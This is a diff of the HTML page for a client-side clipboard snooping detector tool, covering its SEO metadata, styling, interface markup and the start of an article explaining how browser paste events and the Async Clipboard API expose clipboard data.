@@ -6,10 +6,108 @@
   
   <title>Clipboard Leak &amp; Snooping Detector — Free Offline Privacy Tool | BitDark</title>
   <meta name="title" content="Clipboard Leak &amp; Snooping Detector — Free Offline Privacy Tool | BitDark" />
-  <meta name="description" content="Audit, inspect, and evaluate clipboard snooping events, mime-type exposures, and unauthorized reading vectors locally in your browser. Zero tracking, zero network egress." />
-  <meta name="keywords" content="clipboard leak detector, test clipboard snooping, clipboard privacy audit, browser clipboard exposure, local security tool" />
-  <meta name="robots" content="index, follow" />
-  <link rel="canonical" href="https://bitdark.net/tools/privacy/clipboard-test" />
+  <meta name="description" content="Audit, inspect, and evaluate system clipboard snooping vectors, Async Clipboard API permissions, MIME-type exposures, and sensitive credential leakage locally in browser memory. Zero tracking, zero network egress." />
+  <meta name="keywords" content="clipboard leak detector, test clipboard snooping, clipboard privacy audit, browser clipboard exposure, async clipboard api security, pastejacking test, local privacy tool, detect clipboard access, clipboard security scanner, inspect datatransfer mime types" />
+  <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large" />
+  <link rel="canonical" href="https://bitdark.net/tools/privacy/clipboard-test/" />
+
+  <!-- Open Graph / Facebook -->
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://bitdark.net/tools/privacy/clipboard-test/" />
+  <meta property="og:title" content="Clipboard Leak &amp; Snooping Detector — In-Memory Privacy Audit | BitDark" />
+  <meta property="og:description" content="Audit clipboard snooping vulnerabilities, read permissions, MIME type exposures, and sensitive credential leaks offline in browser RAM. Zero tracking, zero network egress." />
+  <meta property="og:image" content="https://bitdark.net/assets/preview-banner.png" />
+
+  <!-- Twitter / X -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:url" content="https://bitdark.net/tools/privacy/clipboard-test/" />
+  <meta name="twitter:title" content="Clipboard Leak &amp; Snooping Detector | BitDark" />
+  <meta name="twitter:description" content="Inspect clipboard buffer security, Async Clipboard API triggers, and DOM paste events locally in memory with zero network telemetry." />
+
+  <!-- JSON-LD Structured Data: WebApplication, TechArticle, and FAQPage -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebApplication",
+        "name": "Clipboard Leak & Snooping Detector",
+        "url": "https://bitdark.net/tools/privacy/clipboard-test/",
+        "applicationCategory": "SecurityApplication",
+        "operatingSystem": "All modern browsers (Offline-ready)",
+        "offers": {
+          "@type": "Offer",
+          "price": "0",
+          "priceCurrency": "USD"
+        },
+        "description": "Defensive cybersecurity utility to audit browser clipboard access vectors, inspect Async Clipboard API permissions, evaluate DOM DataTransfer MIME representations, and flag unredacted secrets entirely within client-side memory."
+      },
+      {
+        "@type": "TechArticle",
+        "headline": "Browser Clipboard Security Architecture, API Permissions, and Clipboard Snooping Forensics",
+        "url": "https://bitdark.net/tools/privacy/clipboard-test/",
+        "author": {
+          "@type": "Organization",
+          "name": "BitDark.NET",
+          "url": "https://bitdark.net/"
+        },
+        "publisher": {
+          "@type": "Organization",
+          "name": "BitDark.NET",
+          "url": "https://bitdark.net/"
+        },
+        "datePublished": "2024-04-10",
+        "dateModified": "2026-10-31",
+        "description": "Comprehensive technical guide on system clipboard vulnerabilities, W3C Async Clipboard API permission models, pastejacking attack surfaces, operating system buffer isolation, and defensive operational security."
+      },
+      {
+        "@type": "FAQPage",
+        "mainEntity": [
+          {
+            "@type": "Question",
+            "name": "Can a malicious website silently read my clipboard without my permission?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "In modern W3C-compliant browsers, background web pages cannot silently read your clipboard text or binary data via the Async Clipboard API without an explicit user gesture (such as clicking a button) and granting explicit browser-level clipboard-read permission. However, any time you trigger a paste event (Ctrl+V or Cmd+V) inside an active web page, the receiving DOM element immediately acquires full access to your clipboard contents without triggering any browser permission prompt."
+            }
+          },
+          {
+            "@type": "Question",
+            "name": "What is pastejacking and how does it compromise developer terminals?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "Pastejacking is a cross-origin buffer exploitation technique where a malicious web page tricks a user into copying safe-looking text (e.g., 'git clone https://...'), but silently replaces the clipboard payload with weaponized shell commands followed by a newline character (\\n). When pasted into a terminal emulator, the newline automatically executes the payload instantly before the user can inspect it."
+            }
+          },
+          {
+            "@type": "Question",
+            "name": "How does the Async Clipboard API differ from legacy DOM onpaste events?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "The Async Clipboard API (navigator.clipboard.read and readText) allows JavaScript to programmatically query the operating system clipboard buffer asynchronously, subject to Permissions API policies and document focus. In contrast, the legacy DOM onpaste event is purely synchronous and event-driven: it fires only when the user invokes a native paste action, providing access via the event's DataTransfer object."
+            }
+          },
+          {
+            "@type": "Question",
+            "name": "Does incognito or private browsing mode isolate my clipboard buffer?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "No. The system clipboard is an operating system-wide global memory buffer shared across all running processes, desktop applications, and browser windows. Copying a password or private key in a private window leaves that exact string accessible to non-private windows, desktop background processes, and mobile apps until overwritten."
+            }
+          },
+          {
+            "@type": "Question",
+            "name": "Does BitDark transmit my clipboard data over the network?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "No. BitDark operates on an air-gapped zero-network-egress security architecture. All clipboard reading, MIME type extraction, and credential heuristic pattern scanning execute strictly within local browser volatile memory. Zero bytes are ever logged or transmitted across the wire."
+            }
+          }
+        ]
+      }
+    ]
+  }
+  </script>
 
   <style>
     :root {
@@ -25,107 +123,148 @@
       --atom-amber: #e5c07b;
       --atom-coral: #e06c75;
       --atom-green: #98c379;
-      --font-ui: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      --font-code: "SFMono-Regular", Consolas, Menlo, monospace;
+      --atom-purple: #c678dd;
+      --font-ui: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+      --font-code: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
     }
 
     * { box-sizing: border-box; margin: 0; padding: 0; }
+    
     body {
       background-color: var(--atom-gutter);
       color: var(--atom-text);
       font-family: var(--font-ui);
-      line-height: 1.5;
+      line-height: 1.65;
       -webkit-font-smoothing: antialiased;
     }
 
-    /* Navbar */
+    /* Navbar: Centered & Clean */
     .navbar {
       background-color: var(--atom-bg);
       border-bottom: 1px solid var(--atom-border);
-      padding: 10px 24px;
+      padding: 12px 24px;
       position: sticky;
       top: 0;
       z-index: 50;
     }
     .nav-inner {
-      max-width: 1100px;
+      max-width: 1200px;
       margin: 0 auto;
-      display: grid;
-      grid-template-columns: auto 1fr auto;
+      display: flex;
+      justify-content: space-between;
       align-items: center;
       gap: 16px;
     }
     .brand {
-      font-size: 1.15rem;
+      font-size: 1.25rem;
       font-weight: 700;
       font-family: var(--font-code);
       color: var(--atom-heading);
       text-decoration: none;
+      letter-spacing: -0.02em;
     }
     .brand span { color: var(--atom-amber); }
-    .trust-badge {
-      justify-self: center;
+    
+    .nav-center-badge {
       display: inline-flex;
       align-items: center;
       gap: 8px;
-      font-size: 0.74rem;
+      font-size: 0.78rem;
       font-family: var(--font-code);
       background-color: var(--atom-surface);
       border: 1px solid var(--atom-border);
-      padding: 4px 12px;
+      padding: 6px 14px;
       border-radius: 4px;
       color: var(--atom-text);
     }
-    .orbit-dot {
-      width: 7px; height: 7px; border-radius: 50%;
-      background: var(--atom-cyan); box-shadow: 0 0 6px var(--atom-cyan);
+    .pulse-dot {
+      width: 8px; height: 8px; border-radius: 50%;
+      background: var(--atom-cyan); box-shadow: 0 0 8px var(--atom-cyan);
     }
-    .ip-pill-nav {
-      justify-self: end;
-      background-color: var(--atom-gutter);
-      border: 1px solid var(--atom-border);
-      padding: 4px 12px;
-      border-radius: 4px;
-      font-family: var(--font-code);
-      font-size: 0.72rem;
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-    }
-    .ip-pill-nav strong { color: var(--atom-amber); }
-    .ip-divider { color: var(--atom-border); }
 
-    /* Layout */
-    .wrapper { max-width: 1100px; margin: 0 auto; padding: 32px 20px 60px; }
+    /* Layout Wrapper */
+    .wrapper { 
+      max-width: 1200px; 
+      margin: 0 auto; 
+      padding: 30px 20px 60px; 
+    }
     
-    .breadcrumb {
+    /* Breadcrumb Hierarchy with Strict Trailing Slashes */
+    .breadcrumb-nav {
       font-family: var(--font-code);
-      font-size: 0.78rem;
-      margin-bottom: 20px;
+      font-size: 0.82rem;
+      margin-bottom: 24px;
       color: var(--atom-muted);
+      display: flex;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 8px;
     }
-    .breadcrumb a { color: var(--atom-cyan); text-decoration: none; }
-    
-    .tool-header { margin-bottom: 24px; }
-    .tool-header h1 { font-size: 1.8rem; color: var(--atom-heading); margin-bottom: 6px; }
-    .tool-header p { color: var(--atom-text); font-size: 0.95rem; }
+    .breadcrumb-nav a { 
+      color: var(--atom-cyan); 
+      text-decoration: none; 
+      transition: color 0.15s ease;
+    }
+    .breadcrumb-nav a:hover { 
+      color: var(--atom-amber); 
+      text-decoration: underline; 
+    }
+    .breadcrumb-nav .sep { color: var(--atom-border); }
+    .breadcrumb-nav .current { color: var(--atom-heading); font-weight: 600; }
 
-    /* Tool Card & Workspace */
+    .tool-header { margin-bottom: 28px; }
+    .tool-header h1 { 
+      font-size: 2.2rem; 
+      color: var(--atom-heading); 
+      margin-bottom: 12px; 
+      font-weight: 700;
+      line-height: 1.25;
+      letter-spacing: -0.01em;
+    }
+    .tool-header p { 
+      color: var(--atom-text); 
+      font-size: 1.05rem; 
+      max-width: 950px;
+      line-height: 1.6;
+    }
+
+    /* Zero-CLS Ad Container Slot */
+    .ad-container-slot {
+      display: none;
+      min-height: 0;
+      margin: 28px 0;
+      text-align: center;
+      background: var(--atom-bg);
+      border: 1px dashed var(--atom-border);
+      border-radius: 6px;
+      padding: 10px;
+      overflow: hidden;
+      transition: all 0.3s ease-in-out;
+    }
+    .ad-container-slot:has(iframe),
+    .ad-container-slot:has(ins[data-ad-status="filled"]) {
+      display: block !important;
+      min-height: 100px;
+    }
+
+    /* Tool Interactive Card */
     .tool-card {
       background-color: var(--atom-surface);
       border: 1px solid var(--atom-border);
-      border-radius: 6px;
-      padding: 24px;
-      margin-bottom: 24px;
-      box-shadow: 0 4px 16px rgba(0,0,0,0.2);
+      border-radius: 8px;
+      padding: 30px;
+      margin-bottom: 30px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+      content-visibility: auto;
+      contain-intrinsic-size: 0 450px;
     }
 
     .action-row {
       display: flex;
       flex-wrap: wrap;
-      gap: 12px;
+      gap: 14px;
       align-items: center;
-      margin-bottom: 20px;
+      margin-bottom: 22px;
     }
 
     .btn-atom {
@@ -134,22 +273,30 @@
       font-weight: 700;
       border: none;
       border-radius: 4px;
-      padding: 9px 18px;
+      padding: 12px 24px;
       cursor: pointer;
       font-family: var(--font-ui);
-      font-size: 0.84rem;
-      transition: opacity 0.2s;
+      font-size: 16px;
+      min-height: 44px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      transition: opacity 0.2s, background-color 0.2s;
     }
-    .btn-atom:hover { opacity: 0.9; }
+    .btn-atom:hover { opacity: 0.92; }
     .btn-secondary {
       background-color: var(--atom-border);
       color: var(--atom-text);
     }
+    .btn-secondary:hover {
+      background-color: #424953;
+      color: var(--atom-heading);
+    }
 
     .paste-surface {
       border: 2px dashed var(--atom-border);
-      border-radius: 6px;
-      padding: 28px 20px;
+      border-radius: 8px;
+      padding: 40px 24px;
       text-align: center;
       background-color: var(--atom-bg);
       outline: none;
@@ -158,23 +305,38 @@
     }
     .paste-surface:focus {
       border-color: var(--atom-amber);
-      background-color: rgba(229, 192, 123, 0.04);
+      background-color: rgba(229, 192, 123, 0.05);
     }
-    .paste-surface p { font-size: 0.9rem; color: var(--atom-text); margin-bottom: 6px; }
-    .paste-surface span { font-size: 0.76rem; color: var(--atom-muted); font-family: var(--font-code); }
+    .paste-surface p { 
+      font-size: 1.05rem; 
+      color: var(--atom-heading); 
+      margin-bottom: 8px; 
+    }
+    .paste-surface span { 
+      font-size: 0.84rem; 
+      color: var(--atom-muted); 
+      font-family: var(--font-code); 
+      display: block;
+    }
 
     /* Results Workspace */
-    .results-area { margin-top: 24px; display: none; }
+    .results-area { 
+      margin-top: 28px; 
+      display: none; 
+    }
     
     .status-banner {
       display: flex;
       align-items: center;
       justify-content: space-between;
-      padding: 12px 16px;
-      border-radius: 4px;
-      margin-bottom: 20px;
+      flex-wrap: wrap;
+      gap: 12px;
+      padding: 14px 20px;
+      border-radius: 6px;
+      margin-bottom: 24px;
       font-family: var(--font-code);
-      font-size: 0.82rem;
+      font-size: 0.9rem;
+      font-weight: 600;
     }
     .status-safe {
       background-color: rgba(152, 195, 121, 0.12);
@@ -194,25 +356,26 @@
 
     .meta-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-      gap: 12px;
-      margin-bottom: 20px;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 16px;
+      margin-bottom: 24px;
     }
     .meta-item {
       background-color: var(--atom-bg);
       border: 1px solid var(--atom-border);
-      padding: 12px;
-      border-radius: 4px;
+      padding: 14px 18px;
+      border-radius: 6px;
     }
     .meta-label {
-      font-size: 0.72rem;
+      font-size: 0.74rem;
       color: var(--atom-muted);
       text-transform: uppercase;
       font-family: var(--font-code);
-      margin-bottom: 4px;
+      margin-bottom: 6px;
+      letter-spacing: 0.05em;
     }
     .meta-val {
-      font-size: 0.85rem;
+      font-size: 0.92rem;
       color: var(--atom-heading);
       font-family: var(--font-code);
       word-break: break-all;
@@ -221,116 +384,330 @@
     .viewer-box {
       background-color: var(--atom-gutter);
       border: 1px solid var(--atom-border);
-      border-radius: 4px;
-      padding: 14px;
+      border-radius: 6px;
+      padding: 18px;
       font-family: var(--font-code);
-      font-size: 0.82rem;
-      max-height: 350px;
+      font-size: 0.84rem;
+      max-height: 400px;
       overflow-y: auto;
       white-space: pre-wrap;
       color: var(--atom-heading);
       line-height: 1.6;
     }
 
-    /* Disclaimer Callout */
+    /* Forensic Disclaimer Card */
     .disclaimer-card {
       background-color: var(--atom-bg);
       border: 1px solid var(--atom-border);
       border-left: 4px solid var(--atom-amber);
-      border-radius: 4px;
-      padding: 16px 18px;
-      margin-bottom: 36px;
-      font-size: 0.84rem;
-      line-height: 1.6;
+      border-radius: 6px;
+      padding: 22px 24px;
+      margin-bottom: 40px;
+      font-size: 0.92rem;
+      line-height: 1.7;
       color: var(--atom-text);
     }
     .disclaimer-header {
       display: flex;
       align-items: center;
-      gap: 8px;
+      gap: 10px;
       font-family: var(--font-code);
       font-weight: 700;
       color: var(--atom-amber);
-      margin-bottom: 6px;
-      font-size: 0.88rem;
+      margin-bottom: 10px;
+      font-size: 1rem;
     }
     .disclaimer-card strong { color: var(--atom-heading); }
 
-    /* Technical Docs Section */
-    .doc-section {
-      border-top: 1px solid var(--atom-border);
-      padding-top: 28px;
-      font-size: 0.88rem;
-      line-height: 1.7;
+    /* Long-Form Authoritative SEO Documentation */
+    .article-container {
+      background-color: var(--atom-surface);
+      border: 1px solid var(--atom-border);
+      border-radius: 8px;
+      padding: 44px;
+      margin-bottom: 40px;
+      line-height: 1.8;
+      font-size: 0.98rem;
+      content-visibility: auto;
+      contain-intrinsic-size: 0 2500px;
     }
-    .doc-section h2 { color: var(--atom-heading); font-size: 1.2rem; margin-bottom: 10px; margin-top: 20px; }
-    .doc-section h2:first-of-type { margin-top: 0; }
-    .doc-section p { margin-bottom: 12px; }
-    .doc-section ul { margin-left: 20px; margin-bottom: 14px; }
-    .doc-section li { margin-bottom: 6px; }
-    .doc-section code {
+    .article-container h2 {
+      color: var(--atom-heading);
+      font-size: 1.65rem;
+      margin-top: 40px;
+      margin-bottom: 18px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--atom-border);
+      letter-spacing: -0.01em;
+    }
+    .article-container h2:first-of-type { margin-top: 0; }
+    .article-container h3 {
+      color: var(--atom-cyan);
+      font-size: 1.25rem;
+      margin-top: 28px;
+      margin-bottom: 12px;
+      font-family: var(--font-code);
+    }
+    .article-container h4 {
+      color: var(--atom-amber);
+      font-size: 1.05rem;
+      margin-top: 20px;
+      margin-bottom: 8px;
+      font-family: var(--font-ui);
+      font-weight: 600;
+    }
+    .article-container p { margin-bottom: 18px; color: var(--atom-text); }
+    .article-container ul, .article-container ol {
+      margin-left: 28px;
+      margin-bottom: 22px;
+    }
+    .article-container li { margin-bottom: 10px; color: var(--atom-text); }
+    .article-container code {
       font-family: var(--font-code);
       background-color: var(--atom-bg);
       border: 1px solid var(--atom-border);
-      padding: 2px 6px;
-      border-radius: 3px;
+      padding: 3px 6px;
+      border-radius: 4px;
       color: var(--atom-cyan);
+      font-size: 0.88em;
+    }
+    .article-container pre {
+      background-color: var(--atom-bg);
+      border: 1px solid var(--atom-border);
+      border-radius: 6px;
+      padding: 18px;
+      overflow-x: auto;
+      font-family: var(--font-code);
+      font-size: 0.85rem;
+      color: var(--atom-heading);
+      margin-bottom: 22px;
+      line-height: 1.55;
+    }
+    .article-container blockquote {
+      border-left: 4px solid var(--atom-cyan);
+      background-color: var(--atom-bg);
+      padding: 18px 22px;
+      margin: 24px 0;
+      border-radius: 0 6px 6px 0;
+      font-style: italic;
+      color: var(--atom-heading);
     }
 
-    /* Footer */
-    .bottom-bar {
-      margin-top: 40px;
-      padding-top: 20px;
-      border-top: 1px solid var(--atom-border);
+    /* Comparison & Spec Tables */
+    .tech-table-wrapper {
+      overflow-x: auto;
+      margin: 26px 0;
+      border: 1px solid var(--atom-border);
+      border-radius: 6px;
+    }
+    .tech-table {
+      width: 100%;
+      border-collapse: collapse;
+      text-align: left;
+      font-size: 0.9rem;
+    }
+    .tech-table th, .tech-table td {
+      padding: 14px 18px;
+      border-bottom: 1px solid var(--atom-border);
+    }
+    .tech-table th {
+      background-color: var(--atom-bg);
+      color: var(--atom-heading);
+      font-family: var(--font-code);
+      text-transform: uppercase;
+      font-size: 0.78rem;
+      letter-spacing: 0.05em;
+    }
+    .tech-table tr:last-child td { border-bottom: none; }
+    .tech-table tr:hover td { background-color: rgba(255,255,255,0.02); }
+
+    /* Interactive Accordion FAQs */
+    .faq-block { margin-top: 36px; }
+    .faq-item {
+      border: 1px solid var(--atom-border);
+      border-radius: 6px;
+      margin-bottom: 14px;
+      background-color: var(--atom-bg);
+      overflow: hidden;
+    }
+    .faq-question {
+      padding: 18px 22px;
+      cursor: pointer;
+      font-weight: 600;
+      color: var(--atom-heading);
       display: flex;
       justify-content: space-between;
       align-items: center;
-      font-size: 0.78rem;
-      font-family: var(--font-code);
-      color: var(--atom-muted);
+      user-select: none;
+      min-height: 44px;
+      font-size: 1rem;
     }
-    .bottom-bar a { color: var(--atom-text); text-decoration: none; }
-    .bottom-bar a:hover { color: var(--atom-amber); }
+    .faq-question::after {
+      content: "+";
+      font-family: var(--font-code);
+      font-size: 1.3rem;
+      color: var(--atom-cyan);
+      transition: transform 0.2s;
+    }
+    .faq-item.active .faq-question::after {
+      content: "−";
+      color: var(--atom-amber);
+    }
+    .faq-answer {
+      padding: 0 22px;
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.35s ease-out, padding 0.3s ease;
+      color: var(--atom-text);
+      font-size: 0.94rem;
+      line-height: 1.75;
+    }
+    .faq-item.active .faq-answer {
+      padding: 0 22px 20px;
+      max-height: 600px;
+    }
+
+    /* Related Tools Grid (Internal SEO) */
+    .related-tools-section {
+      margin-top: 48px;
+      padding-top: 32px;
+      border-top: 1px solid var(--atom-border);
+    }
+    .related-tools-section h3 {
+      font-size: 1.35rem;
+      color: var(--atom-heading);
+      margin-bottom: 20px;
+    }
+    .related-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 18px;
+    }
+    .related-card {
+      background-color: var(--atom-surface);
+      border: 1px solid var(--atom-border);
+      border-radius: 6px;
+      padding: 18px;
+      text-decoration: none;
+      transition: border-color 0.2s, transform 0.2s;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      min-height: 110px;
+    }
+    .related-card:hover {
+      border-color: var(--atom-amber);
+      transform: translateY(-2px);
+    }
+    .related-card-title {
+      font-size: 0.98rem;
+      font-weight: 700;
+      color: var(--atom-heading);
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .related-card-title span { color: var(--atom-cyan); }
+    .related-card-desc {
+      font-size: 0.84rem;
+      color: var(--atom-muted);
+      line-height: 1.5;
+    }
+
+    /* Master Clean Footer */
+    .footer {
+      border-top: 1px solid var(--atom-border);
+      padding: 36px 0 24px;
+      margin-top: 50px;
+      font-size: 0.86rem;
+      color: var(--atom-muted);
+      font-family: var(--font-code);
+    }
+    .footer-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 18px;
+      padding: 0 20px;
+    }
+    .footer-left { 
+      display: flex; 
+      align-items: center; 
+      gap: 8px; 
+      color: var(--atom-text);
+    }
+    .footer-links-right {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 18px;
+    }
+    .footer-links-right a {
+      color: var(--atom-text);
+      text-decoration: none;
+      transition: color 0.2s;
+      min-height: 44px;
+      display: inline-flex;
+      align-items: center;
+    }
+    .footer-links-right a:hover { color: var(--atom-amber); }
+
+    /* Mobile Accessibility Breakpoints */
+    @media (max-width: 768px) {
+      .navbar { padding: 12px 16px; }
+      .nav-inner { justify-content: space-between; }
+      .tool-header h1 { font-size: 1.7rem; }
+      .article-container { padding: 26px 18px; font-size: 0.94rem; }
+      .action-row { flex-direction: column; align-items: stretch; }
+      .btn-atom { width: 100%; }
+      .footer-inner { flex-direction: column; align-items: flex-start; }
+      .footer-links-right { width: 100%; justify-content: flex-start; }
+    }
   </style>
-
-  
-  
-
 </head>
 <body>
 
+  <!-- Cockpit Header: Cleaned (Brand + Trust Badge Only) -->
   <header class="navbar">
     <div class="nav-inner">
       <a href="/" class="brand">Bit<span>Dark</span>.net</a>
-      <div class="trust-badge">
-        <span class="orbit-dot"></span> 100% Client-Side • Zero Logs
-      </div>
-      <div class="ip-pill-nav">
-        <span>IPv4: <strong id="ipv4Display">Checking...</strong></span>
-        <span class="ip-divider">·</span>
-        <span>IPv6: <strong id="ipv6Display">Checking...</strong></span>
+      <div class="nav-center-badge">
+        <span class="pulse-dot"></span> 100% Client-Side • Zero Network Egress
       </div>
     </div>
   </header>
 
   <main class="wrapper">
-    <nav class="breadcrumb">
-      <a href="/">Home</a> / <a href="/#privacy">Privacy &amp; Anonymity</a> / clipboard-test
+    <!-- Breadcrumb Hierarchy with Strict Trailing Slashes -->
+    <nav class="breadcrumb-nav" aria-label="Breadcrumb Navigation">
+      <a href="/">Home</a>
+      <span class="sep">/</span>
+      <a href="/tools/privacy/">Privacy &amp; Anonymity</a>
+      <span class="sep">/</span>
+      <span class="current">Clipboard Leak &amp; Snooping Detector</span>
     </nav>
 
     <div class="tool-header">
       <h1>Clipboard Snooping &amp; Leakage Detector</h1>
-      <p>Inspect what web pages can access from your system clipboard via the Async Clipboard API and legacy DOM event handlers. Test permissions, MIME representations, and sensitive pattern exposure.</p>
+      <p>Inspect what web applications, background scripts, and browser extensions can extract from your operating system clipboard buffer. Evaluate W3C Async Clipboard API permissions, DOM paste event disclosures, MIME-type representations, and unredacted sensitive credential leakage in local browser RAM.</p>
+    </div>
+
+    <!-- AdSense Safe Placement Slot #1 (Zero CLS: Hidden until script loads & fills) -->
+    <div class="ad-container-slot" id="topAdSlot" aria-label="Siloed Advertising Slot">
+      <!-- Injected ad units render here -->
     </div>
 
     <!-- Active Tool Workspace -->
-    <div class="tool-card">
+    <section class="tool-card" id="toolWorkspace" aria-label="Interactive Clipboard Inspection Terminal">
       <div class="action-row">
         <button class="btn-atom" id="btnInspectApi">Request Clipboard Read API</button>
         <button class="btn-atom btn-secondary" id="btnClear">Clear Diagnostics</button>
       </div>
 
-      <div class="paste-surface" id="pasteTarget" tabindex="0">
+      <div class="paste-surface" id="pasteTarget" tabindex="0" role="region" aria-label="Paste target container">
         <p><strong>Click inside here and press Ctrl+V / Cmd+V</strong></p>
         <span>Audits standard event-driven paste leakage without requiring explicit browser permission prompts</span>
       </div>
@@ -357,98 +734,477 @@
           </div>
         </div>
 
-        <div class="meta-label" style="margin-bottom: 6px;">Captured Payload Content:</div>
-        <div class="viewer-box" id="rawViewer">Awaiting clipboard interaction...</div>
+        <div class="meta-label" style="margin-bottom: 8px;">Captured Payload Content:</div>
+        <div class="viewer-box" id="rawViewer" tabindex="0">Awaiting clipboard interaction...</div>
       </div>
-    </div>
+    </section>
 
-    <!-- Operational Disclaimer -->
+    <!-- Authoritative Operational Boundaries & Disclaimer -->
     <aside class="disclaimer-card">
       <div class="disclaimer-header">
-        <span>⚠️</span> Operational Boundaries &amp; Sandbox Notice
+        <span>⚠️</span> Forensic Boundaries & Legal Disclaimer
       </div>
       <p>
-        <strong>All clipboard inspections run strictly within local memory.</strong> Modern browsers restrict continuous background clipboard access to focused tabs or explicit user gesture triggers. This utility demonstrates how easily malicious sites can extract active buffer contents if permissions are inadvertently granted or if a user pastes into an arbitrary component. No captured clipboard strings or binary types leave your local machine. BitDark.net is not responsible for any direct, indirect, incidental, or consequential damages resulting from the use or misuse of this tool.
+        <strong>BitDark.net is not responsible for any direct, indirect, incidental, or consequential damages, misattributions, legal liabilities, or forensic errors arising from the use or interpretation of data provided by this tool. Client-side heuristic scanners cannot replace hardware trust chains or formal chain-of-custody verification.</strong>
+      </p>
+      <p style="margin-top: 10px;">
+        <strong>All clipboard inspections run strictly within local memory.</strong> Modern browsers restrict continuous background clipboard access to focused browsing contexts or explicit user gesture triggers. This utility demonstrates how easily untrusted web applications or rogue scripts can extract active buffer contents if permissions are inadvertently granted or if a user executes a standard paste operation into an arbitrary interface component. No captured clipboard strings, binary types, or private credentials leave your local browser machine.
       </p>
     </aside>
 
-    <!-- Technical & Educational Content -->
-    <article class="doc-section">
-      <h2>How Web Pages Intercept Clipboard Data</h2>
-      <p>Browsers provide multiple vectors for web applications to interact with the system buffer:</p>
+    <!-- Comprehensive Technical Authority Article -->
+    <article class="article-container">
+      <h2>The Mechanics of Clipboard Insecurity: How Web Browsers Access the Global Buffer</h2>
+      <p>
+        The operating system clipboard is among the most heavily utilized, yet architectural fragile, features of modern graphical computing. From its inception in Xerox PARC workstations to contemporary desktop and mobile operating systems—including Microsoft Windows, macOS, Linux (X11 and Wayland), Android, and iOS—the clipboard operates as an inter-process shared memory buffer. When a user executes a copy or cut command, the originating application writes structured data into global memory. From that moment until another copy action overwrites it, that data remains accessible to every running application on the machine that possesses standard user privileges.
+      </p>
+      <p>
+        For decades, this architecture posed limited risk because desktop applications operated within trusted administrative perimeters. However, the modern web browser fundamentally changed this security boundary. Today, web browsers execute billions of lines of untrusted, third-party JavaScript daily. If a web application can silently access the operating system clipboard buffer, it can inspect passwords, one-time authentication codes, API keys, crypto wallet seed phrases, private conversational snippets, and proprietary trade secrets without triggering operating system firewall warnings.
+      </p>
+      <p>
+        To balance developer utility (such as rich web-based text editors, spreadsheet applications, and graphics suites) with user privacy, the World Wide Web Consortium (W3C) and browser vendors engineered two distinct interfaces: the synchronous legacy <strong>DOM Clipboard Event model</strong> and the modern asynchronous <strong>W3C Async Clipboard API</strong>. Understanding how these complementary interfaces operate is essential for identifying exposure vectors.
+      </p>
+
+      <h2>How Web Pages Intercept Clipboard Data: The Two Primary Vectors</h2>
+      <p>
+        Web applications and client-side scripts capture clipboard data through two fundamentally different architectural paths, each with distinct security profiles, permission requirements, and forensic indicators.
+      </p>
+
+      <h3>1. Event-Driven Paste Handlers (The Synchronous DOM Model)</h3>
+      <p>
+        Whenever you interact with a web page and press <code>Ctrl+V</code> (Windows/Linux) or <code>Cmd+V</code> (macOS), or select "Paste" from a contextual right-click menu, the browser creates a synthetic DOM <code>ClipboardEvent</code> with the event type <code>paste</code>.
+      </p>
+      <p>
+        This event is passed to any JavaScript event listener registered on the target element or bubbling up to the document root:
+      </p>
+      <pre><code>// Synchronous event interception via standard DOM
+document.addEventListener('paste', (event) => {
+  const clipboardData = event.clipboardData || window.clipboardData;
+  if (!clipboardData) return;
+
+  // Enumerate all MIME types embedded in the buffer
+  const types = clipboardData.types;
+  const rawText = clipboardData.getData('text/plain');
+  const rawHtml = clipboardData.getData('text/html');
+
+  console.log("Captured MIME types:", types);
+  console.log("Captured plain-text string:", rawText);
+});</code></pre>
+      <p>
+        Crucially, <strong>the synchronous DOM paste event requires zero browser permissions</strong>. The browser assumes that because the physical user pressed the paste key combination while focused on the webpage, the user intended to share the entire contents of their clipboard with the current origin. If you accidentally paste into an invisible or malicious input element, the site captures your data instantly.
+      </p>
+
+      <h3>2. The Asynchronous Clipboard API (Programmatic Reading)</h3>
+      <p>
+        To allow modern Single Page Applications (SPAs) to interact with the clipboard without forcing users to rely on physical keystrokes, the W3C standardized the <strong>Async Clipboard API</strong>, accessed via <code>navigator.clipboard</code>.
+      </p>
+      <p>
+        Unlike the synchronous DOM event, the Async Clipboard API allows a script to read the operating system clipboard programmatically at any time, provided two strict security prerequisites are met:
+      </p>
+      <ol>
+        <li>
+          <strong>Transient User Activation:</strong> The read request must be initiated within the call stack of a direct, trusted user gesture (e.g., clicking a button). A background timer (<code>setTimeout</code>) or asynchronous network callback cannot initiate a read.
+        </li>
+        <li>
